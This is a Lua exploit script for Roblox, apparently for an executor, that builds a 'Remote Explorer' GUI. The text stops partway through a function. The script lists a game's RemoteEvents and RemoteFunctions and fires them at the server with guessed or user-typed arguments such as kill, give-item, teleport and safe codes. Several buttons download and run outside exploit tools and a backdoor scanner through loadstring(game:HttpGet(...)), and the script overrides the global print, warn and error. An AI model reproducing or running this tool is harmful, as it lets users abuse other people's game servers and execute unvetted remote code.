local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local Player = Players.LocalPlayer

if Player.PlayerGui:FindFirstChild("RemoteExplorer") then
    Player.PlayerGui.RemoteExplorer:Destroy()
end

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "RemoteExplorer"
ScreenGui.ResetOnSpawn = false
ScreenGui.DisplayOrder = 100
ScreenGui.Parent = Player:WaitForChild("PlayerGui")

local function ShowNotification(message, isError)
    local notif = Instance.new("Frame")
    notif.Size = UDim2.new(0, 250, 0, 40)
    notif.Position = UDim2.new(0.5, -125, 0, 10)
    notif.BackgroundColor3 = isError and Color3.fromRGB(200, 50, 50) or Color3.fromRGB(50, 150, 50)
    notif.BackgroundTransparency = 0.1
    notif.BorderSizePixel = 0
    notif.Parent = ScreenGui
    Instance.new("UICorner", notif).CornerRadius = UDim.new(0, 6)
    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(1, 0, 1, 0)
    txt.Text = message
    txt.Font = Enum.Font.GothamBold
    txt.TextSize = 12
    txt.TextColor3 = Color3.new(1,1,1)
    txt.BackgroundTransparency = 1
    txt.Parent = notif
    task.spawn(function()
        task.wait(2)
        notif:TweenSize(UDim2.new(0,250,0,0),"Out","Quad",0.3,true)
        task.wait(0.3)
        notif:Destroy()
    end)
end

local function CopyToClipboard(text)
    pcall(function() setclipboard(text) end)
    ShowNotification("Copied!", false)
end

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 350, 0, 450)
MainFrame.Position = UDim2.new(0.5, -175, 0.5, -225)
MainFrame.BackgroundColor3 = Color3.fromRGB(25,25,25)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui
MainFrame.ClipsDescendants = true
Instance.new("UICorner", MainFrame).CornerRadius = UDim.new(0,8)

local StarsContainer = Instance.new("Frame")
StarsContainer.Size = UDim2.new(1,0,1,0)
StarsContainer.BackgroundTransparency = 1
StarsContainer.Parent = MainFrame
local stars = {}
for i = 1, 100 do
    local star = Instance.new("Frame")
    star.Size = UDim2.new(0, math.random(1,2), 0, math.random(1,2))
    star.Position = UDim2.new(math.random(),0,math.random(),0)
    star.BackgroundColor3 = Color3.fromRGB(255,255,255)
    star.BackgroundTransparency = 0.5
    star.BorderSizePixel = 0
    star.Visible = false
    star.Parent = StarsContainer
    table.insert(stars, star)
end

local Header = Instance.new("Frame")
Header.Size = UDim2.new(1,0,0,35)
Header.BackgroundColor3 = Color3.fromRGB(35,35,35)
Header.BorderSizePixel = 0
Header.Parent = MainFrame
Instance.new("UICorner", Header).CornerRadius = UDim.new(0,8)

local Title = Instance.new("TextLabel")
Title.Text = "  REMOTE EXPLORER"
Title.Font = Enum.Font.GothamBold
Title.TextSize = 14
Title.Size = UDim2.new(0.5,0,1,0)
Title.TextColor3 = Color3.new(1,1,1)
Title.BackgroundTransparency = 1
Title.TextXAlignment = "Left"
Title.Parent = Header

local ExitBtn = Instance.new("TextButton")
ExitBtn.Text = "✕"
ExitBtn.Size = UDim2.new(0,35,1,0)
ExitBtn.Position = UDim2.new(1,-35,0,0)
ExitBtn.TextColor3 = Color3.fromRGB(255,80,80)
ExitBtn.BackgroundTransparency = 1
ExitBtn.Parent = Header
ExitBtn.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)

local MinimizeBtn = Instance.new("TextButton")
MinimizeBtn.Text = "—"
MinimizeBtn.Size = UDim2.new(0,35,1,0)
MinimizeBtn.Position = UDim2.new(1,-70,0,0)
MinimizeBtn.TextColor3 = Color3.new(0.8,0.8,0.8)
MinimizeBtn.BackgroundTransparency = 1
MinimizeBtn.Parent = Header

local Side = Instance.new("Frame")
Side.Size = UDim2.new(0,90,1,-35)
Side.Position = UDim2.new(0,0,0,35)
Side.BackgroundColor3 = Color3.fromRGB(30,30,30)
Side.BorderSizePixel = 0
Side.Parent = MainFrame

local Container = Instance.new("Frame")
Container.Size = UDim2.new(1,-100,1,-45)
Container.Position = UDim2.new(0,95,0,40)
Container.BackgroundTransparency = 1
Container.Parent = MainFrame

local isMinimized = false
MinimizeBtn.MouseButton1Click:Connect(function()
    isMinimized = not isMinimized
    Side.Visible = not isMinimized
    Container.Visible = not isMinimized
    if isMinimized then
        MainFrame:TweenSize(UDim2.new(0,350,0,35),"Out","Quad",0.2,true)
        MinimizeBtn.Text = "+"
    else
        MainFrame:TweenSize(UDim2.new(0,350,0,450),"Out","Quad",0.2,true)
        MinimizeBtn.Text = "—"
    end
end)

local allTabs = {}

local function CreateTab(name)
    local f = Instance.new("ScrollingFrame")
    f.Size = UDim2.new(1,0,1,0)
    f.BackgroundTransparency = 1
    f.ScrollBarThickness = 2
    f.Visible = false
    f.CanvasSize = UDim2.new(0,0,0,0)
    f.AutomaticCanvasSize = Enum.AutomaticSize.Y
    f.Parent = Container
    local layout = Instance.new("UIListLayout", f)
    layout.Padding = UDim.new(0,5)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1,-10,0,30)
    b.Text = name
    b.Font = Enum.Font.Gotham
    b.BackgroundColor3 = Color3.fromRGB(45,45,45)
    b.TextColor3 = Color3.new(1,1,1)
    b.Parent = Side
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,4)
    b.MouseButton1Click:Connect(function()
        for _, t in pairs(allTabs) do t.Visible = false end
        f.Visible = true
    end)
    allTabs[name] = f
    return f
end

local function CreateButton(parent, text, color, callback)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(1,-5,0,35)
    b.Text = text
    b.BackgroundColor3 = color
    b.Font = Enum.Font.GothamSemibold
    b.TextColor3 = Color3.new(1,1,1)
    b.Parent = parent
    Instance.new("UICorner", b).CornerRadius = UDim.new(0,6)
    b.MouseButton1Click:Connect(callback)
    return b
end

Instance.new("UIListLayout", Side).Padding = UDim.new(0,5)
Instance.new("UIPadding", Side).PaddingLeft = UDim.new(0,5)

local function GenerateArgsFromName(remoteName)
    local name = remoteName:lower()
    if name:find("item") or name:find("tool") or name:find("give") then
        return {"DefaultTool"}
    elseif name:find("door") then
        return {"Front"}
    elseif name:find("energy") then
        return {100}
    elseif name:find("teleport") or name:find("tp") then
        return {CFrame.new(0,10,0)}
    elseif name:find("kill") or name:find("damage") or name:find("drown") then
        return {Player, 100}
    elseif name:find("message") or name:find("chat") or name:find("say") then
        return {"Hello World"}
    elseif name:find("key") then
        return {"Key"}
    elseif name:find("ladder") then
        return {1}
    elseif name:find("cat") then
        return {}
    elseif name:find("bed") then
        return {}
    elseif name:find("safe") then
        return {"0000"}
    elseif name:find("mission") or name:find("basement") then
        return {}
    elseif name:find("unlock") then
        return {}
    else
        return {true}
    end
end

local function FindRemoteInGame(remoteName, remoteType)
    local services = {game.ReplicatedStorage, game.Workspace, game.Lighting}
    local function search(parent)
        if not parent then return nil end
        for _, child in pairs(parent:GetChildren()) do
            if remoteType == "Event" and child:IsA("RemoteEvent") and child.Name == remoteName then
                return child
            elseif remoteType == "Function" and child:IsA("RemoteFunction") and child.Name == remoteName then
                return child
            else
                local found = search(child)
                if found then return found end
            end
        end
        return nil
    end
    for _, service in pairs(services) do
        if service then
            local found = search(service)
            if found then return found end
        end
    end
    return nil
end

local function CreateFloatWindow(title, remoteType, fullPath)
    local FloatFrame = Instance.new("Frame")
    FloatFrame.Size = UDim2.new(0, 350, 0, 250)
    FloatFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
    FloatFrame.BackgroundColor3 = Color3.fromRGB(30,30,35)
    FloatFrame.BorderSizePixel = 0
    FloatFrame.BackgroundTransparency = 0.05
    FloatFrame.Active = true
    FloatFrame.Draggable = true
    FloatFrame.Parent = ScreenGui
    Instance.new("UICorner", FloatFrame).CornerRadius = UDim.new(0,8)
    
    local FloatHeader = Instance.new("Frame")
    FloatHeader.Size = UDim2.new(1,0,0,30)
    FloatHeader.BackgroundColor3 = Color3.fromRGB(40,40,45)
    FloatHeader.BorderSizePixel = 0
    FloatHeader.Parent = FloatFrame
    Instance.new("UICorner", FloatHeader).CornerRadius = UDim.new(0,8)
    
    local FloatTitle = Instance.new("TextLabel")
    FloatTitle.Text = title
    FloatTitle.Font = Enum.Font.GothamBold
    FloatTitle.TextSize = 11
    FloatTitle.Size = UDim2.new(1,-90,1,0)
    FloatTitle.Position = UDim2.new(0,10,0,0)
    FloatTitle.TextColor3 = Color3.new(1,1,1)
    FloatTitle.BackgroundTransparency = 1
    FloatTitle.TextXAlignment = "Left"
    FloatTitle.Parent = FloatHeader
    
    local FloatMinimize = Instance.new("TextButton")
    FloatMinimize.Text = "—"
    FloatMinimize.Size = UDim2.new(0,30,1,0)
    FloatMinimize.Position = UDim2.new(1,-60,0,0)
    FloatMinimize.TextColor3 = Color3.new(0.8,0.8,0.8)
    FloatMinimize.BackgroundTransparency = 1
    FloatMinimize.Parent = FloatHeader
    
    local FloatClose = Instance.new("TextButton")
    FloatClose.Text = "✕"
    FloatClose.Size = UDim2.new(0,30,1,0)
    FloatClose.Position = UDim2.new(1,-30,0,0)
    FloatClose.TextColor3 = Color3.fromRGB(255,80,80)
    FloatClose.BackgroundTransparency = 1
    FloatClose.Parent = FloatHeader
    
    local FloatContent = Instance.new("Frame")
    FloatContent.Size = UDim2.new(1,-20,1,-50)
    FloatContent.Position = UDim2.new(0,10,0,40)
    FloatContent.BackgroundTransparency = 1
    FloatContent.Parent = FloatFrame
    
    local TextBox = Instance.new("TextBox")
    TextBox.Size = UDim2.new(1,0,0,80)
    TextBox.Position = UDim2.new(0,0,0,0)
    TextBox.BackgroundColor3 = Color3.fromRGB(20,20,25)
    TextBox.TextColor3 = Color3.new(1,1,1)
    TextBox.Text = ""
    TextBox.TextWrapped = true
    TextBox.TextXAlignment = "Left"
    TextBox.TextYAlignment = "Top"
    TextBox.ClearTextOnFocus = false
    TextBox.Parent = FloatContent
    Instance.new("UICorner", TextBox).CornerRadius = UDim.new(0,6)
    
    local GenerateBtn = Instance.new("TextButton")
    GenerateBtn.Size = UDim2.new(1,0,0,30)
    GenerateBtn.Position = UDim2.new(0,0,0,90)
    GenerateBtn.Text = "Generate Args"
    GenerateBtn.BackgroundColor3 = Color3.fromRGB(80,100,200)
    GenerateBtn.Font = Enum.Font.GothamSemibold
    GenerateBtn.TextColor3 = Color3.new(1,1,1)
    GenerateBtn.Parent = FloatContent
    Instance.new("UICorner", GenerateBtn).CornerRadius = UDim.new(0,6)
    
    local FireBtn = Instance.new("TextButton")
    FireBtn.Size = UDim2.new(0.48,0,0,35)
    FireBtn.Position = UDim2.new(0,0,0,130)
    FireBtn.Text = remoteType == "Event" and "Fire Event" or "Call Function"
    FireBtn.BackgroundColor3 = Color3.fromRGB(50,150,80)
    FireBtn.Font = Enum.Font.GothamSemibold
    FireBtn.TextColor3 = Color3.new(1,1,1)
    FireBtn.Parent = FloatContent
    Instance.new("UICorner", FireBtn).CornerRadius = UDim.new(0,6)
    
    local CopyBtn = Instance.new("TextButton")
    CopyBtn.Size = UDim2.new(0.48,0,0,35)
    CopyBtn.Position = UDim2.new(0.52,0,0,130)
    CopyBtn.Text = "Copy Path"
    CopyBtn.BackgroundColor3 = Color3.fromRGB(100,100,150)
    CopyBtn.Font = Enum.Font.GothamSemibold
    CopyBtn.TextColor3 = Color3.new(1,1,1)
    CopyBtn.Parent = FloatContent
    Instance.new("UICorner", CopyBtn).CornerRadius = UDim.new(0,6)
    
    local PathLabel = Instance.new("TextLabel")
    PathLabel.Size = UDim2.new(1,0,0,20)
    PathLabel.Position = UDim2.new(0,0,0,175)
    PathLabel.Text = "Path: " .. fullPath
    PathLabel.Font = Enum.Font.Gotham
    PathLabel.TextSize = 10
    PathLabel.TextColor3 = Color3.fromRGB(150,150,150)
    PathLabel.BackgroundTransparency = 1
    PathLabel.Parent = FloatContent
    
    local isFloatMinimized = false
    FloatMinimize.MouseButton1Click:Connect(function()
        isFloatMinimized = not isFloatMinimized
        if isFloatMinimized then
            FloatContent.Visible = false
            FloatFrame:TweenSize(UDim2.new(0,350,0,30),"Out","Quad",0.2,true)
            FloatMinimize.Text = "+"
        else
            FloatContent.Visible = true
            FloatFrame:TweenSize(UDim2.new(0,350,0,250),"Out","Quad",0.2,true)
            FloatMinimize.Text = "—"
        end
    end)
    
    FloatClose.MouseButton1Click:Connect(function()
        FloatFrame:Destroy()
    end)
    
    GenerateBtn.MouseButton1Click:Connect(function()
        local args = GenerateArgsFromName(title)
        local jsonArgs = {}
        for _, v in ipairs(args) do
            if type(v) == "string" then
                jsonArgs[#jsonArgs + 1] = '"' .. v .. '"'
            elseif type(v) == "number" then
                jsonArgs[#jsonArgs + 1] = tostring(v)
            elseif type(v) == "boolean" then
                jsonArgs[#jsonArgs + 1] = tostring(v)
            else
                jsonArgs[#jsonArgs + 1] = '"' .. tostring(v) .. '"'
            end
        end
        TextBox.Text = "[" .. table.concat(jsonArgs, ", ") .. "]"
        ShowNotification("Generated!", false)
    end)
    
    CopyBtn.MouseButton1Click:Connect(function()
        local copyText = remoteType == "Event" and (fullPath .. ':FireServer()') or (fullPath .. ':InvokeServer()')
        CopyToClipboard(copyText)
    end)
    
    -- FIRE BUTTON - БЕЗ ПРОВЕРКИ НА JSON, ВЫПОЛНЯЕТ ЛЮБУЮ ХУЙНЮ
    FireBtn.MouseButton1Click:Connect(function()
        local args = {}
        local text = TextBox.Text
        
        if text == "" then
            args = {}
        else
            local success, decoded = pcall(function()
                return game:GetService("HttpService"):JSONDecode(text)
            end)
            if success then
                args = decoded
            else
                args = {text}
            end
        end
        
        local target = FindRemoteInGame(title, remoteType)
        if target then
            local ok, err = pcall(function()
                if remoteType == "Event" then
                    target:FireServer(unpack(args))
                else
                    target:InvokeServer(unpack(args))
                end
            end)
            if ok then
                ShowNotification("Success!", false)
            else
                ShowNotification("Error: " .. tostring(err), true)
            end
        else
            ShowNotification("Remote not found!", true)
        end
    end)
    
    return FloatFrame
end

local tInfo = CreateTab("Info")
local itxt = Instance.new("TextLabel", tInfo)
itxt.Size = UDim2.new(1,0,0,120)
itxt.Text = "REMOTE EXPLORER v1\n\nCreated by spynote\nDiscord: @_thefinal_\nRoblox: sedfortip\n\nScans: ReplicatedStorage,\nWorkspace, Lighting"
itxt.TextColor3 = Color3.new(1,1,1)
itxt.BackgroundTransparency = 1
itxt.Font = Enum.Font.Gotham

local tSpy = CreateTab("Spy")
CreateButton(tSpy, "Get Cobalt", Color3.fromRGB(80,150,200), function()
    ShowNotification("Loading Cobalt...", false)
    loadstring(game:HttpGet("https://github.com/notpoiu/cobalt/releases/latest/download/Cobalt.luau"))()
end)
CreateButton(tSpy, "Get Infinite Yield", Color3.fromRGB(200,150,50), function()
    ShowNotification("Loading Infinite Yield...", false)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)
CreateButton(tSpy, "Turtle Spy", Color3.fromRGB(180, 40, 40), function()
    ShowNotification("Loading Turtle Spy...", false)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Turtle-Brand/Turtle-Spy/main/source.lua", true))()
end)
CreateButton(tSpy, "RemoteExplorer", Color3.fromRGB(180, 40, 40), function()
    ShowNotification("Loading RemoteExplorer...", false)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/CoolExploit/TestLua/refs/heads/main/RemoteExplorer', true))()
end)
CreateButton(tSpy, "LalolHub", Color3.fromRGB(200, 150, 50), function()
    ShowNotification("Loading LalolHub...", false)
    loadstring(game:HttpGet('https://raw.githubusercontent.com/Its-LALOL/LALOL-Hub/main/Backdoor-Scanner/script', true))()
end)
CreateButton(tSpy, "Hydroxide", Color3.fromRGB(100, 150, 250), function()
    ShowNotification("Loading Hydroxide...", false)
    
    local owner = "Upbolt"
    local branch = "revision"
    
    local function webImport(file)
        return loadstring(game:HttpGetAsync(("https://raw.githubusercontent.com/%s/Hydroxide/%s/%s.lua"):format(owner, branch, file)), file .. '.lua')()
    end
    
    webImport("init")
    webImport("ui/main")
end)


local tEvents = CreateTab("Events")
local eventsContainer = Instance.new("ScrollingFrame")
eventsContainer.Size = UDim2.new(1,0,1,0)
eventsContainer.BackgroundTransparency = 1
eventsContainer.ScrollBarThickness = 4
eventsContainer.CanvasSize = UDim2.new(0,0,0,0)
eventsContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
eventsContainer.Parent = tEvents
Instance.new("UIListLayout", eventsContainer).Padding = UDim.new(0,3)

local eventsLabel = Instance.new("TextLabel")
eventsLabel.Size = UDim2.new(1,0,0,25)
eventsLabel.Text = "=== REMOTE EVENTS ==="
eventsLabel.TextColor3 = Color3.fromRGB(200,200,100)
eventsLabel.BackgroundTransparency = 1
eventsLabel.Font = Enum.Font.GothamBold
eventsLabel.Parent = eventsContainer

local function ScanForEvents(parent, path, results)
    if not parent then return end
    for _, child in pairs(parent:GetChildren()) do
        local newPath = path .. "/" .. child.Name
        if child:IsA("RemoteEvent") then
            table.insert(results, {name = child.Name, path = newPath})
        else
            -- РЕКУРСИВНО ЗАХОДИМ В ЛЮБЫЕ ДОЧЕРНИЕ ОБЪЕКТЫ (папки, модели и т.д.)
            ScanForEvents(child, newPath, results)
        end
    end
end

local allEvents = {}
local scanServices = {game.ReplicatedStorage, game.Workspace, game.Lighting}
for _, svc in pairs(scanServices) do
    if svc then
        ScanForEvents(svc, svc.Name, allEvents)
    end
end

if #allEvents > 0 then
    for _, ev in pairs(allEvents) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1,-5,0,30)
        btn.Text = ev.name
        btn.BackgroundColor3 = Color3.fromRGB(60,60,70)
        btn.Font = Enum.Font.Gotham
        btn.TextColor3 = Color3.new(1,1,1)
        btn.TextSize = 11
        btn.Parent = eventsContainer
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
        btn.MouseButton1Click:Connect(function()
            CreateFloatWindow(ev.name, "Event", ev.path)
        end)
    end
else
    local nothing = Instance.new("TextLabel")
    nothing.Size = UDim2.new(1,0,0,30)
    nothing.Text = "No RemoteEvents found!"
    nothing.TextColor3 = Color3.fromRGB(255,100,100)
    nothing.BackgroundTransparency = 1
    nothing.Parent = eventsContainer
end

-- ВКЛАДКА PLAYERS (ИСПРАВЛЕННАЯ)
local tPlayers = CreateTab("Players")

local playersContainer = Instance.new("ScrollingFrame")
playersContainer.Size = UDim2.new(1, 0, 1, 0)
playersContainer.BackgroundTransparency = 1
playersContainer.ScrollBarThickness = 4
playersContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
playersContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
playersContainer.Parent = tPlayers
Instance.new("UIListLayout", playersContainer).Padding = UDim.new(0, 3)

local playersLabel = Instance.new("TextLabel")
playersLabel.Size = UDim2.new(1, 0, 0, 25)
playersLabel.Text = "=== PLAYERS (REMOTES) ==="
playersLabel.TextColor3 = Color3.fromRGB(255, 200, 100)
playersLabel.BackgroundTransparency = 1
playersLabel.Font = Enum.Font.GothamBold
playersLabel.Parent = playersContainer

local function ScanForRemotesInPlayers()
    -- Очищаем старые кнопки
    for _, v in pairs(playersContainer:GetChildren()) do
        if v:IsA("TextButton") then v:Destroy() end
    end
    playersLabel.Parent = playersContainer
    
    for _, plr in pairs(Players:GetPlayers()) do
        local function searchInPlayer(parent, path)
            for _, child in pairs(parent:GetChildren()) do
                local newPath = path .. "/" .. child.Name
                if child:IsA("RemoteEvent") or child:IsA("RemoteFunction") then
                    local btn = Instance.new("TextButton")
                    btn.Size = UDim2.new(1, -5, 0, 30)
                    btn.Text = plr.Name .. ": " .. child.Name
                    btn.BackgroundColor3 = Color3.fromRGB(60, 60, 70)
                    btn.Font = Enum.Font.Gotham
                    btn.TextColor3 = Color3.new(1, 1, 1)
                    btn.TextSize = 11
                    btn.Parent = playersContainer
                    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 4)
                    
                    local remoteType = child:IsA("RemoteEvent") and "Event" or "Function"
                    btn.MouseButton1Click:Connect(function()
                        CreateFloatWindow(child.Name, remoteType, newPath)
                    end)
                else
                    -- ЗАХОДИМ В ЛЮБЫЕ ДОЧЕРНИЕ ОБЪЕКТЫ (не только Folder/Model/Tool)
                    searchInPlayer(child, newPath)
                end
            end
        end
        searchInPlayer(plr, "Players/" .. plr.Name)
    end
end

ScanForRemotesInPlayers()

-- Обновление при добавлении/удалении игроков
Players.PlayerAdded:Connect(function()
    ScanForRemotesInPlayers()
end)

Players.PlayerRemoving:Connect(function()
    ScanForRemotesInPlayers()
end)

local tFunctions = CreateTab("Functions")
local functionsContainer = Instance.new("ScrollingFrame")
functionsContainer.Size = UDim2.new(1,0,1,0)
functionsContainer.BackgroundTransparency = 1
functionsContainer.ScrollBarThickness = 4
functionsContainer.CanvasSize = UDim2.new(0,0,0,0)
functionsContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
functionsContainer.Parent = tFunctions
Instance.new("UIListLayout", functionsContainer).Padding = UDim.new(0,3)

local functionsLabel = Instance.new("TextLabel")
functionsLabel.Size = UDim2.new(1,0,0,25)
functionsLabel.Text = "=== REMOTE FUNCTIONS ==="
functionsLabel.TextColor3 = Color3.fromRGB(100,200,200)
functionsLabel.BackgroundTransparency = 1
functionsLabel.Font = Enum.Font.GothamBold
functionsLabel.Parent = functionsContainer

local function ScanForFunctions(parent, path, results)
    if not parent then return end
    for _, child in pairs(parent:GetChildren()) do
        local newPath = path .. "/" .. child.Name
        if child:IsA("RemoteFunction") then
            table.insert(results, {name = child.Name, path = newPath})
        else
            -- РЕКУРСИВНО ЗАХОДИМ В ЛЮБЫЕ ДОЧЕРНИЕ ОБЪЕКТЫ (папки, модели и т.д.)
            ScanForFunctions(child, newPath, results)
        end
    end
end

local allFunctions = {}
for _, svc in pairs(scanServices) do
    if svc then
        ScanForFunctions(svc, svc.Name, allFunctions)
    end
end

if #allFunctions > 0 then
    for _, fn in pairs(allFunctions) do
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(1,-5,0,30)
        btn.Text = fn.name
        btn.BackgroundColor3 = Color3.fromRGB(60,60,70)
        btn.Font = Enum.Font.Gotham
        btn.TextColor3 = Color3.new(1,1,1)
        btn.TextSize = 11
        btn.Parent = functionsContainer
        Instance.new("UICorner", btn).CornerRadius = UDim.new(0,4)
        btn.MouseButton1Click:Connect(function()
            CreateFloatWindow(fn.name, "Function", fn.path)
        end)
    end
else
    local nothing = Instance.new("TextLabel")
    nothing.Size = UDim2.new(1,0,0,30)
    nothing.Text = "No RemoteFunctions found!"
    nothing.TextColor3 = Color3.fromRGB(255,100,100)
    nothing.BackgroundTransparency = 1
    nothing.Parent = functionsContainer
end

-- ВКЛАДКА CONSOLE (ИСПРАВЛЕННАЯ)
local tConsole = CreateTab("Console")

-- Окно логов
local consoleFrame = Instance.new("Frame")
consoleFrame.Size = UDim2.new(1, -10, 1, -10)
consoleFrame.Position = UDim2.new(0, 5, 0, 5)
consoleFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
consoleFrame.BorderSizePixel = 0
consoleFrame.Parent = tConsole
Instance.new("UICorner", consoleFrame).CornerRadius = UDim.new(0, 6)

local consoleScroll = Instance.new("ScrollingFrame")
consoleScroll.Size = UDim2.new(1, -10, 1, -10)
consoleScroll.Position = UDim2.new(0, 5, 0, 5)
consoleScroll.BackgroundTransparency = 1
consoleScroll.CanvasSize = UDim2.new(0, 0, 0, 0)
consoleScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
consoleScroll.ScrollBarThickness = 6
consoleScroll.Parent = consoleFrame

local consoleLayout = Instance.new("UIListLayout", consoleScroll)
consoleLayout.Padding = UDim.new(0, 2)

local function AddLog(message, color)
    local logLine = Instance.new("TextLabel")
    logLine.Size = UDim2.new(1, -10, 0, 20)
    logLine.Text = "[" .. os.date("%H:%M:%S") .. "] " .. message
    logLine.TextColor3 = color or Color3.fromRGB(200, 200, 200)
    logLine.BackgroundTransparency = 1
    logLine.Font = Enum.Font.Gotham
    logLine.TextSize = 11
    logLine.TextXAlignment = Enum.TextXAlignment.Left
    logLine.Parent = consoleScroll
    Instance.new("UICorner", logLine).CornerRadius = UDim.new(0, 4)
    
    task.wait(0.05)
    consoleScroll.CanvasPosition = Vector2.new(0, consoleScroll.CanvasSize.Y.Offset)
end

-- Кнопка очистки
local clearConsoleBtn = Instance.new("TextButton")
clearConsoleBtn.Size = UDim2.new(0, 80, 0, 25)
clearConsoleBtn.Position = UDim2.new(1, -85, 0, 5)
clearConsoleBtn.Text = "Clear"
clearConsoleBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 120)
clearConsoleBtn.Font = Enum.Font.GothamSemibold
clearConsoleBtn.TextColor3 = Color3.new(1, 1, 1)
clearConsoleBtn.TextSize = 11
clearConsoleBtn.Parent = consoleFrame
Instance.new("UICorner", clearConsoleBtn).CornerRadius = UDim.new(0, 4)
clearConsoleBtn.MouseButton1Click:Connect(function()
    for _, v in pairs(consoleScroll:GetChildren()) do
        if v:IsA("TextLabel") then v:Destroy() end
    end
    AddLog("Console cleared", Color3.fromRGB(255, 200, 100))
end)

-- ПЕРЕХВАТ ЧЕРЕЗ ГЛОБАЛЬНЫЕ ТАБЛИЦЫ (РАБОТАЕТ ВЕЗДЕ)
local env = getgenv and getgenv() or _G or getfenv()

local oldPrint = env.print
env.print = function(...)
    local args = {...}
    local msg = ""
    for _, v in pairs(args) do
        msg = msg .. tostring(v) .. " "
    end
    AddLog(msg, Color3.fromRGB(200, 200, 200))
    if oldPrint then oldPrint(...) end
end

local oldWarn = env.warn or warn
env.warn = function(...)
    local args = {...}
    local msg = ""
    for _, v in pairs(args) do
        msg = msg .. tostring(v) .. " "
    end
    AddLog("[WARN] " .. msg, Color3.fromRGB(255, 200, 100))
    if oldWarn then oldWarn(...) end
end

-- Перехват ошибок
local oldError = env.error or error
env.error = function(msg, level)
    AddLog("[ERROR] " .. tostring(msg), Color3.fromRGB(255, 100, 100))
    return oldError(msg, level)
end

AddLog("Console started!", Color3.fromRGB(100, 255, 100))

--[[
    НОВАЯ ВКЛАДКА "SCANNING"
    Добавьте этот код в конец вашего основного скрипта, перед строкой allTabs["Info"].Visible = true
--]]

-- Создаём вкладку Scanning
local tScanning = CreateTab("Scanning")

-- Кнопка для полного сканера (loadstring оригинального скрипта)
CreateButton(tScanning, "Scan All Remotes (Full)", Color3.fromRGB(200, 100, 50), function()
    ShowNotification("Loading full scanner...", false)
    loadstring(game:HttpGet("https://rawscripts.net/raw/Natural-Disaster-Survival-Beckdeer-skenner-27520"))()
end)

-- Панель для выборочного сканирования
local scanPanel = Instance.new("Frame")
scanPanel.Size = UDim2.new(1, -10, 0, 150)
scanPanel.Position = UDim2.new(0, 5, 0, 45)
scanPanel.BackgroundColor3 = Color3.fromRGB(35, 35, 40)
scanPanel.BorderSizePixel = 0
scanPanel.Parent = tScanning
Instance.new("UICorner", scanPanel).CornerRadius = UDim.new(0, 6)

local selectedRemoteLabel = Instance.new("TextLabel")
selectedRemoteLabel.Size = UDim2.new(1, -10, 0, 25)
selectedRemoteLabel.Position = UDim2.new(0, 5, 0, 5)
selectedRemoteLabel.Text = "Selected Remote: None"
selectedRemoteLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
selectedRemoteLabel.BackgroundTransparency = 1
selectedRemoteLabel.Font = Enum.Font.Gotham
selectedRemoteLabel.TextSize = 12
selectedRemoteLabel.TextXAlignment = Enum.TextXAlignment.Left
selectedRemoteLabel.Parent = scanPanel

-- Кнопка выбора ремувента (откроет список)
local selectRemoteBtn = Instance.new("TextButton")
selectRemoteBtn.Size = UDim2.new(1, -10, 0, 30)
selectRemoteBtn.Position = UDim2.new(0, 5, 0, 35)
selectRemoteBtn.Text = "Select Remote Event/Function"
selectRemoteBtn.BackgroundColor3 = Color3.fromRGB(80, 100, 200)
selectRemoteBtn.Font = Enum.Font.GothamSemibold
selectRemoteBtn.TextColor3 = Color3.new(1, 1, 1)
selectRemoteBtn.Parent = scanPanel
Instance.new("UICorner", selectRemoteBtn).CornerRadius = UDim.new(0, 6)

-- Список для выбора ремувента (окно)
local remoteListWindow = nil
local selectedRemote = nil

selectRemoteBtn.MouseButton1Click:Connect(function()
    if remoteListWindow then remoteListWindow:Destroy() end
    
    remoteListWindow = Instance.new("Frame")
    remoteListWindow.Size = UDim2.new(0, 300, 0, 400)
    remoteListWindow.Position = UDim2.new(0.5, -150, 0.5, -200)
    remoteListWindow.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
    remoteListWindow.BorderSizePixel = 0
    remoteListWindow.Parent = ScreenGui
    Instance.new("UICorner", remoteListWindow).CornerRadius = UDim.new(0, 8)
    
    local titleBar = Instance.new("Frame")
    titleBar.Size = UDim2.new(1, 0, 0, 30)
    titleBar.BackgroundColor3 = Color3.fromRGB(40, 40, 45)
    titleBar.Parent = remoteListWindow
    Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 8)
    
    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, -60, 1, 0)
    title.Position = UDim2.new(0, 10, 0, 0)
    title.Text = "Select a Remote"
    title.TextColor3 = Color3.new(1, 1, 1)
    title.BackgroundTransparency = 1
    title.Font = Enum.Font.GothamBold
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.Parent = titleBar
    
    local closeBtn = Instance.new("TextButton")
    closeBtn.Size = UDim2.new(0, 30, 1, 0)
    closeBtn.Position = UDim2.new(1, -30, 0, 0)
    closeBtn.Text = "✕"
    closeBtn.TextColor3 = Color3.fromRGB(255, 80, 80)
    closeBtn.BackgroundTransparency = 1
    closeBtn.Parent = titleBar
    closeBtn.MouseButton1Click:Connect(function() remoteListWindow:Destroy() remoteListWindow = nil end)
    
